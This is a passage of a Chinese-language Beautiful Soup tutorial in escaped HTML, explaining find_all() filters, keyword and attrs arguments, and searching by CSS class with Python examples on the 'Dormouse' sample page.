&lt;h3 id=&quot;True&quot;&gt;&lt;a href=&quot;#True&quot; class=&quot;headerlink&quot; title=&quot;True&quot;&gt;&lt;/a&gt;True&lt;/h3&gt;&lt;p&gt;&lt;code&gt;True&lt;/code&gt; 可以匹配任何值,下面代码查找到所有的tag,但是不会返回字符串节点&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for tag in soup.find_all(True):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(tag.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# head&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# title&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# body&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;方法&quot;&gt;&lt;a href=&quot;#方法&quot; class=&quot;headerlink&quot; title=&quot;方法&quot;&gt;&lt;/a&gt;方法&lt;/h3&gt;&lt;p&gt;如果没有合适过滤器,那么还可以定义一个方法,方法只接受一个元素参数 [4] ,如果这个方法返回 &lt;code&gt;True&lt;/code&gt; 表示当前元素匹配并且被找到,如果不是则反回 &lt;code&gt;False&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下面方法校验了当前元素,如果包含 &lt;code&gt;class&lt;/code&gt; 属性却不包含 &lt;code&gt;id&lt;/code&gt; 属性,那么将返回 &lt;code&gt;True&lt;/code&gt;:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;def has_class_but_no_id(tag):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return tag.has_attr(&amp;apos;class&amp;apos;) and not tag.has_attr(&amp;apos;id&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将这个方法作为参数传入 &lt;code&gt;find_all()&lt;/code&gt; 方法,将得到所有&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(has_class_but_no_id)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were...&amp;lt;/p&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;返回结果中只有&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签没有&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,因为&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签还定义了”id”,没有返回&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;,因为&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;和&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;中没有定义”class”属性.&lt;/p&gt;
&lt;p&gt;下面代码找到所有被文字包含的节点内容:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import NavigableString&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def surrounded_by_strings(tag):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return (isinstance(tag.next_element, NavigableString)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            and isinstance(tag.previous_element, NavigableString))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for tag in soup.find_all(surrounded_by_strings):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print tag.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# p&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;现在来了解一下搜索方法的细节&lt;/p&gt;
&lt;h2 id=&quot;find-all&quot;&gt;&lt;a href=&quot;#find-all&quot; class=&quot;headerlink&quot; title=&quot;find_all()&quot;&gt;&lt;/a&gt;find_all()&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find_all( name , attrs , recursive , text , **kwargs )&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;find_all()&lt;/code&gt; 方法搜索当前tag的所有tag子节点,并判断是否符合过滤器的条件.这里有几个例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;p&amp;quot;, &amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(id=&amp;quot;link2&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;import re&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find(text=re.compile(&amp;quot;sisters&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Once upon a time there were three little sisters; and their names were\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有几个方法很相似,还有几个方法是新的,参数中的 &lt;code&gt;text&lt;/code&gt; 和 &lt;code&gt;id&lt;/code&gt; 是什么含义? 为什么 &lt;code&gt;find_all(&amp;quot;p&amp;quot;, &amp;quot;title&amp;quot;)&lt;/code&gt; 返回的是CSS Class为”title”的&lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt;标签? 我们来仔细看一下 &lt;code&gt;find_all()&lt;/code&gt; 的参数&lt;/p&gt;
&lt;h3 id=&quot;name-参数&quot;&gt;&lt;a href=&quot;#name-参数&quot; class=&quot;headerlink&quot; title=&quot;name 参数&quot;&gt;&lt;/a&gt;name 参数&lt;/h3&gt;&lt;p&gt;&lt;code&gt;name&lt;/code&gt; 参数可以查找所有名字为 &lt;code&gt;name&lt;/code&gt; 的tag,字符串对象会被自动忽略掉.&lt;/p&gt;
&lt;p&gt;简单的用法如下:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;title&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;重申: 搜索 &lt;code&gt;name&lt;/code&gt; 参数的值可以使任一类型的 &lt;a href=&quot;#id25&quot;&gt;过滤器&lt;/a&gt; ,字符窜,正则表达式,列表,方法或是 &lt;code&gt;True&lt;/code&gt; .&lt;/p&gt;
&lt;h3 id=&quot;keyword-参数&quot;&gt;&lt;a href=&quot;#keyword-参数&quot; class=&quot;headerlink&quot; title=&quot;keyword 参数&quot;&gt;&lt;/a&gt;keyword 参数&lt;/h3&gt;&lt;p&gt;如果一个指定名字的参数不是搜索内置的参数名,搜索时会把该参数当作指定名字tag的属性来搜索,如果包含一个名字为 &lt;code&gt;id&lt;/code&gt; 的参数,Beautiful Soup会搜索每个tag的”id”属性.&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(id=&amp;apos;link2&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果传入 &lt;code&gt;href&lt;/code&gt; 参数,Beautiful Soup会搜索每个tag的”href”属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(href=re.compile(&amp;quot;elsie&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;搜索指定名字的属性时可以使用的参数值包括 &lt;a href=&quot;#id27&quot;&gt;字符串&lt;/a&gt; , &lt;a href=&quot;#id28&quot;&gt;正则表达式&lt;/a&gt; , &lt;a href=&quot;#id29&quot;&gt;列表&lt;/a&gt;, &lt;a href=&quot;#true&quot;&gt;True&lt;/a&gt; .&lt;/p&gt;
&lt;p&gt;下面的例子在文档树中查找所有包含 &lt;code&gt;id&lt;/code&gt; 属性的tag,无论 &lt;code&gt;id&lt;/code&gt; 的值是什么:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(id=True)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用多个指定名字的参数可以同时过滤tag的多个属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(href=re.compile(&amp;quot;elsie&amp;quot;), id=&amp;apos;link1&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;three&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;有些tag属性在搜索不能使用,比如HTML5中的 &lt;code&gt;data-*&lt;/code&gt; 属性:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;data_soup = BeautifulSoup(&amp;apos;foo!&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;data_soup.find_all(data-foo=&amp;quot;value&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# SyntaxError: keyword can&amp;apos;t be an expression&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是可以通过 &lt;code&gt;find_all()&lt;/code&gt; 方法的 &lt;code&gt;attrs&lt;/code&gt; 参数定义一个字典参数来搜索包含特殊属性的tag:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;data_soup.find_all(attrs=&amp;#123;&amp;quot;data-foo&amp;quot;: &amp;quot;value&amp;quot;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [foo!]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;按CSS搜索&quot;&gt;&lt;a href=&quot;#按CSS搜索&quot; class=&quot;headerlink&quot; title=&quot;按CSS搜索&quot;&gt;&lt;/a&gt;按CSS搜索&lt;/h3&gt;&lt;p&gt;按照CSS类名搜索tag的功能非常实用,但标识CSS类名的关键字 &lt;code&gt;class&lt;/code&gt; 在Python中是保留字,使用 &lt;code&gt;class&lt;/code&gt; 做参数会导致语法错误.从Beautiful Soup的4.1.1版本开始,可以通过 &lt;code&gt;class_&lt;/code&gt; 参数搜索有指定CSS类名的tag:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;quot;a&amp;quot;, class_=&amp;quot;sister&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;class_&lt;/code&gt; 参数同样接受不同类型的 &lt;code&gt;过滤器&lt;/code&gt; ,字符串,正则表达式,方法或 &lt;code&gt;True&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(class_=re.compile(&amp;quot;itl&amp;quot;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;def has_six_characters(css_class):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return css_class is not None and len(css_class) == 6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(class_=has_six_characters)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;tag的 &lt;code&gt;class&lt;/code&gt; 属性是 &lt;a href=&quot;#id12&quot;&gt;多值属性&lt;/a&gt; .按照CSS类名搜索tag时,可以分别搜索tag中的每个CSS类名:&lt;/p&gt;
